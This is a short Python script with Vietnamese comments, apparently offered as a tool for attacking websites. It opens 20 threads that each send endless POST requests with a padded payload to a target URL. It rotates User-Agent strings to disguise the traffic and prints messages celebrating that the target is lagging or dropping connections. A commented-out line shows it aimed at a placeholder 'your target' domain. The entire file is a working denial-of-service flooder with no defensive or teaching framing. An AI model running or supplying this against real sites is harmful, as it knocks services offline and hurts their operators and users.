import requests
import threading
import random
import time

# Danh sách User-Agent để biến ảo
ua_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/122.0"
]

def werewolf_strike(url, payload):
    while True:
        try:
            headers = {'User-Agent': random.choice(ua_list)}
            # Tấn công bằng cách gửi dữ liệu liên tục
            response = requests.post(url, data={'data': payload}, headers=headers, timeout=5)
            print(f"[*] Đang tấn công... Status: {response.status_code}")
        except:
            print("[!] Mục tiêu đang bắt đầu lag hoặc mất kết nối...")

def start_multi_attack(target_url):
    payload = "werewolf_power_9999" * 100 # Tạo gói dữ liệu nặng
    threads = []
    
    print(f"[🔥] Khởi động đợt tấn công đa luồng vào: {target_url}")
    
    # Tạo 20 con sói tấn công cùng lúc
    for i in range(20):
        t = threading.Thread(target=werewolf_strike, args=(target_url, payload))
        t.start()
        threads.append(t)

# Chạy thử
# start_multi_attack("https://muc-tieu-cua-ban.com")
